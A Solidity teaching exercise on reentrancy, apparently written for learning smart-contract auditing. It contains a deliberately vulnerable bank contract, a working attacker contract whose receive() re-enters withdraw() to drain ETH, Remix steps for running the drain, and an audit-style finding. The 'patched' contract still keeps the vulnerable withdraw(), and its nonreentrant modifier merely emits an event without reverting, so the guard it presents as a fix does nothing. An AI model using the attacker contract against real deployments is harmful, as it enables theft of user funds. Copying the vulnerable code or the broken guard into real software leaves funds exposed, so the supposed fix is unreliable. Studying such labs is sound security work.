// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

/*
=========================================================
PRACTICAL: Make external call before state update
CONCEPT: Reentrancy risk
=========================================================

OBJECTIVE

- Learn how reentrancy vulnerabilities happen
- Understand dangerous execution ordering
- Learn why external calls are risky
- Think like attacker + auditor

---------------------------------------------------------
CORE IDEA
---------------------------------------------------------

If external call happens BEFORE state update:

attacker may reenter function
before storage changes occur.

---------------------------------------------------------
IMPORTANT UNDERSTANDING
---------------------------------------------------------

External calls transfer:
execution control outside your contract.

---------------------------------------------------------

Called contract may:
- call back
- manipulate execution
- drain funds
- exploit temporary state

---------------------------------------------------------
WHY THIS MATTERS
---------------------------------------------------------

Reentrancy caused:
one of the most famous hacks in Ethereum history.

---------------------------------------------------------
REAL-WORLD USAGE
---------------------------------------------------------

External calls occur in:

- ETH withdrawals
- token transfers
- staking systems
- vaults
- bridges
- lending protocols

---------------------------------------------------------
AUDITOR FOCUS
---------------------------------------------------------

Auditors inspect:

- external-call ordering
- state-update timing
- reentrancy windows
- CEI violations
- callback attack surface

=========================================================
VULNERABLE CONTRACT
=========================================================
*/

contract VulnerableBankval {

    /*
        USER BALANCES
    */
    mapping(address => uint256) public balances;

    /*
    =====================================================
    DEPOSIT ETH
    =====================================================
    */

    function deposit()
        external
        payable
    {

        /*
            Store deposited ETH.
        */
        balances[msg.sender] += msg.value;
    }

    /*
    =====================================================
    VULNERABLE WITHDRAW
    =====================================================

    BAD ORDER:
    external call BEFORE state update.
    */

    function withdraw(
        uint256 _amount
    )
        external
    {

        /*
            CHECK:
            user must have balance.
        */
        require(
            balances[msg.sender] >= _amount,
            "Insufficient balance"
        );

        /*
            DANGEROUS EXTERNAL CALL

            Control leaves contract HERE.
        */
        (bool success, ) =
            payable(msg.sender).call{
                value: _amount
            }("");

        require(
            success,
            "Transfer failed"
        );

        /*
            STATE UPDATED TOO LATE

            Vulnerability exists because:
            attacker can reenter BEFORE this line.
        */
        balances[msg.sender] -= _amount;
    }

    /*
    =====================================================
    CHECK CONTRACT BALANCE
    =====================================================
    */

    function contractBalance()
        external
        view
        returns (uint256)
    {

        return address(this).balance;
    }
}

/*
=========================================================
ATTACKER CONTRACT
=========================================================
*/

contract ReentrancyAttackerval {

    /*
        TARGET CONTRACT
    */
    VulnerableBank public target;

    /*
        OWNER
    */
    address public owner;

    /*
        ATTACK COUNTER
    */
    uint256 public attackCounter;

    /*
        LIMIT ATTACK LOOPS
    */
    uint256 public constant MAX_ATTACKS = 3;

    /*
        CONSTRUCTOR
    */
    constructor(address _target)
    {

        target = VulnerableBank(_target);

        owner = msg.sender;
    }

    /*
    =====================================================
    DEPOSIT INTO TARGET
    =====================================================
    */

    function depositToTarget()
        external
        payable
    {

        /*
            Deposit ETH into victim contract.
        */
        target.deposit{value: msg.value}();
    }

    /*
    =====================================================
    START ATTACK
    =====================================================
    */

    function attack()
        external
    {

        /*
            Trigger first withdraw.
        */
        target.withdraw(1 ether);
    }

    /*
    =====================================================
    RECEIVE FUNCTION
    =====================================================

    Automatically executes when
    target sends ETH.
    */

    receive()
        external
        payable
    {

        /*
            Reenter while target still has ETH.
        */
        if (
            address(target).balance >= 1 ether
            &&
            attackCounter < MAX_ATTACKS
        ) {

            attackCounter++;

            /*
                REENTER TARGET

                Balance NOT updated yet.
            */
            target.withdraw(1 ether);
        }
    }

    /*
    =====================================================
    WITHDRAW STOLEN ETH
    =====================================================
    */

    function withdrawLoot()
        external
    {

        require(
            msg.sender == owner,
            "Not owner"
        );

        payable(owner).transfer(
            address(this).balance
        );
    }
}

/*
=========================================================
EXECUTION FLOW
=========================================================

STEP 1:
Deploy VulnerableBank

---------------------------------------------------------

STEP 2:
Fund VulnerableBank with ETH

=========================================================
STEP 3
=========================================================

Deploy ReentrancyAttacker

Constructor input:
VulnerableBank address

=========================================================
STEP 4
=========================================================

Call:
depositToTarget()

VALUE:
1 ETH

---------------------------------------------------------

Attacker now has:
1 ETH balance in target.

=========================================================
STEP 5
=========================================================

Call:
attack()

=========================================================
CRITICAL EXECUTION TRACE
=========================================================

STEP 1:
target.withdraw(1 ether)

---------------------------------------------------------

Balance check passes.

=========================================================
STEP 2
=========================================================

External call executes:

call{value: 1 ether}()

---------------------------------------------------------

CONTROL LEAVES:
VulnerableBank

---------------------------------------------------------

Execution enters:
Attacker.receive()

=========================================================
STEP 3
=========================================================

Inside receive():

attacker reenters:
target.withdraw(1 ether)

=========================================================
IMPORTANT
=========================================================

Target balance storage:
NOT updated yet.

---------------------------------------------------------

balances[attacker]
still equals:
1 ETH

---------------------------------------------------------

Withdraw succeeds AGAIN.

=========================================================
STEP 4
=========================================================

Attack loops repeatedly.

---------------------------------------------------------

Multiple withdrawals occur
before balance reduction.

=========================================================
FINAL RESULT
=========================================================

Attacker drains ETH
from victim contract.

=========================================================
WHY VULNERABILITY EXISTS
=========================================================

BAD ORDER:

---------------------------------------------------------
INTERACTION
---------------------------------------------------------

External ETH call

BEFORE

---------------------------------------------------------
EFFECTS
---------------------------------------------------------

Storage update

=========================================================
SAFE PATTERN
=========================================================

Checks
    ->
Effects
    ->
Interactions

---------------------------------------------------------

Known as:
CEI pattern.

=========================================================
SAFE VERSION
=========================================================

CORRECT ORDER:

---------------------------------------------------------
STEP 1
---------------------------------------------------------

Validate balance

---------------------------------------------------------
STEP 2
---------------------------------------------------------

Reduce balance FIRST

---------------------------------------------------------
STEP 3
---------------------------------------------------------

Send ETH LAST

=========================================================
SAFE EXAMPLE
=========================================================

function safeWithdraw(uint256 amount)
external
{
    require(
        balances[msg.sender] >= amount
    );

    balances[msg.sender] -= amount;

    (bool success, ) =
        payable(msg.sender).call{
            value: amount
        }("");

    require(success);
}

=========================================================
REMIX TESTING
=========================================================

STEP 1:
Deploy VulnerableBank

---------------------------------------------------------

STEP 2:
Deposit several ETH into bank

---------------------------------------------------------

STEP 3:
Deploy ReentrancyAttacker

Input:
bank address

---------------------------------------------------------

STEP 4:
Call:
depositToTarget()

VALUE:
1 ETH

---------------------------------------------------------

STEP 5:
Call:
attack()

---------------------------------------------------------

STEP 6:
Observe:

Victim ETH balance drops repeatedly.

---------------------------------------------------------

STEP 7:
Call:
attackCounter()

EXPECTED:
multiple attack rounds

=========================================================
VERY IMPORTANT SECURITY CONCEPT
=========================================================

Every external call =
potential reentrancy point.

---------------------------------------------------------

Especially:

- call()
- transfer()
- token callbacks
- fallback()
- receive()

=========================================================
COMMON AUDIT RISKS
=========================================================

---------------------------------------------------------
1. STATE UPDATE AFTER CALL
---------------------------------------------------------

Classic reentrancy vulnerability.

---------------------------------------------------------
2. NESTED EXTERNAL CALLS
---------------------------------------------------------

Complex recursive execution risk.

---------------------------------------------------------
3. CALLBACK ATTACKS
---------------------------------------------------------

Receiver manipulates control flow.

---------------------------------------------------------
4. CROSS-FUNCTION REENTRANCY
---------------------------------------------------------

Different functions abused together.

=========================================================
IMPORTANT ATTACK THINKING
=========================================================

Attackers search for:

- external calls
- delayed state updates
- fallback execution
- recursive entry points

---------------------------------------------------------

Then:
build malicious receiver contracts.

=========================================================
REAL AUDITOR PROCESS
=========================================================

Auditors trace:

1. External interaction timing
2. Storage-update order
3. Reentrancy windows
4. Recursive execution paths
5. ETH transfer flow

=========================================================
HOW AUDITORS FIX THIS
=========================================================

---------------------------------------------------------
FIX 1
---------------------------------------------------------

Use CEI pattern.

---------------------------------------------------------
FIX 2
---------------------------------------------------------

Use ReentrancyGuard.

---------------------------------------------------------
FIX 3
---------------------------------------------------------

Minimize external interactions.

=========================================================
MINI CHALLENGE
=========================================================

Modify contract so that:

1. Add safeWithdraw()
2. Add nonReentrant modifier
3. Compare vulnerable vs safe flow
4. Emit events during attack

BONUS:
Create cross-function reentrancy attack.

=========================================================
IMPORTANT CONCEPTS LEARNED
=========================================================

- External calls transfer execution control
- Reentrancy exploits bad ordering
- State updates after calls are dangerous
- call() creates major attack surface
- receive()/fallback() enable reentry
- CEI pattern improves security
- Reentrancy drains funds recursively
- Auditors inspect every external call
- Execution order is security critical
- Reentrancy is one of Solidity's most important vulnerabilities

=========================================================
*/
/*
Title: Reentrancy Vulnerability in withdraw()

Severity: Critical

Reason: The contract transfer ETH to an external address before updating the user's balance, allowing a malicious contract to 
        repeatedly re-enter the function and drain funds

Location: Contract: Vulnerablebank
          Function: withdraw(uint256 _amount)

Vulnerability Description: The withdraw() function performs an external ETH transfer befor updating the user's balance
(bool success, ) =
    payable(msg.sender).call{
        value: _amount
    }("");

- Because control is transferred to an untrusted contract before the balance is reduced the attacker's receive() function can re-enter
withdraw() multiple times

- During each reentrant call, the balance check contines to pass because the balance has not yet been updated

- This allows an attacker to withdraw more ETH than they own and potentially drain the entire contract.

Impact:An attacker can
- Drain ETH beloging to other users
- Withdraw multiple times using a single deposit.
- Cause financial loss at all depositires
- Empty the contract balance.

Proof of Concept:
1. Deploy VulnerablBank
2. Honest users deposit ETH into the contract
3. Deploy ReentrancyAttacker
4. Depost 1 ETH through depositToTarget()
5. Call: attack();
6. withdraw(1 ether) is executed
7. ETH is transferred to the attacker
8. The attacker's receive() function executes
9. withdraw(1 ether ) is called again before the balance update
10. Multiple withdrawals occur unit the attack limit is reached.

Root Cause: The function violates the Check-Effects-Interactions pattern

*/

// PATCHED CODE

contract VulnerableBank {

    /*
        USER BALANCES
    */
    mapping(address => uint256) public balances;

    // REENTRANCY LOCK
    bool private locked;

    // EVENTS
    event Deposit(address indexed user, uint256 amount);

    event VulnerableWithdraw(address indexed user, uint256 amount);

    event SafeWithdraw(address indexed user, uint256 amount);

    event ReentrancyBlocked(address indexed attacker);

    // NON REENTRANT MODIFIER
    modifier nonreentrant()
    {
        if (locked)
        {
            emit ReentrancyBlocked(msg.sender);
        }

        locked = true; _;

        locked = false;
    }

    /*
    =====================================================
    DEPOSIT ETH
    =====================================================
    */

    function deposit()
        external
        payable
    {

        /*
            Store deposited ETH.
        */
        balances[msg.sender] += msg.value;

        emit Deposit(msg.sender, msg.value);
    }

    /*
    =====================================================
    VULNERABLE WITHDRAW
    =====================================================

    BAD ORDER:
    external call BEFORE state update.
    */

    function withdraw(
        uint256 _amount
    )
        external
    {

        /*
            CHECK:
            user must have balance.
        */
        require(
            balances[msg.sender] >= _amount,
            "Insufficient balance"
        );

        /*
            DANGEROUS EXTERNAL CALL

            Control leaves contract HERE.
        */
        (bool success, ) =
            payable(msg.sender).call{
                value: _amount
            }("");

        require(
            success,
            "Transfer failed"
        );

        /*
            STATE UPDATED TOO LATE

            Vulnerability exists because:
            attacker can reenter BEFORE this line.
        */
        balances[msg.sender] -= _amount;

        emit VulnerableWithdraw(msg.sender, _amount);
    }

    // SAFE WITHDRAW
    function safeWithdraw(uint256 _amount) external nonreentrant
    {
        require(balances[msg.sender] >= _amount, "Insufficient balance");

        balances[msg.sender] -= _amount;

        (bool success, ) = payable(msg.sender).call 
        {
            value: _amount 
        } ("");

        require(success, "Transfer failed");

        emit SafeWithdraw(msg.sender, _amount);
    }

    /*
    =====================================================
    CHECK CONTRACT BALANCE
    =====================================================
    */

    function contractBalance()
        external
        view
        returns (uint256)
    {

        return address(this).balance;
    }
}

/*
=========================================================
ATTACKER CONTRACT
=========================================================
*/

contract ReentrancyAttacker {

    /*
        TARGET CONTRACT
    */
    VulnerableBank public target;

    /*
        OWNER
    */
    address public owner;

    /*
        ATTACK COUNTER
    */
    uint256 public attackCounter;

    /*
        LIMIT ATTACK LOOPS
    */
    uint256 public constant MAX_ATTACKS = 3;

    // ATTACK EVENTS
    event AttackStarted(address attacker);

    event Reentered(uint256 attackNumber);

    event LootWithdrawn(uint256 amount);

    /*
        CONSTRUCTOR
    */
    constructor(address _target)
    {

        target = VulnerableBank(_target);

        owner = msg.sender;
    }

    /*
    =====================================================
    DEPOSIT INTO TARGET
    =====================================================
    */

    function depositToTarget()
        external
        payable
    {

        /*
            Deposit ETH into victim contract.
        */
        target.deposit{value: msg.value}();
    }

    /*
    =====================================================
    START ATTACK
    =====================================================
    */

    function attack()
        external
    { 
        emit AttackStarted(msg.sender);

        /*
            Trigger first withdraw.
        */
        target.withdraw(1 ether);
    }

    /*
    =====================================================
    RECEIVE FUNCTION
    =====================================================

    Automatically executes when
    target sends ETH.
    */

    receive()
        external
        payable
    {

        /*
            Reenter while target still has ETH.
        */
        if (
            address(target).balance >= 1 ether
            &&
            attackCounter < MAX_ATTACKS
        ) {

            emit Reentered(attackCounter);

            attackCounter++;

            /*
                REENTER TARGET

                Balance NOT updated yet.
            */
            target.withdraw(1 ether);
        }
    }

    /*
    =====================================================
    WITHDRAW STOLEN ETH
    =====================================================
    */

    function withdrawLoot()
        external
    {

        require(
            msg.sender == owner,
            "Not owner"
        );

        emit LootWithdrawn(address(this).balance);

        payable(owner).transfer(
            address(this).balance
        );
    }
}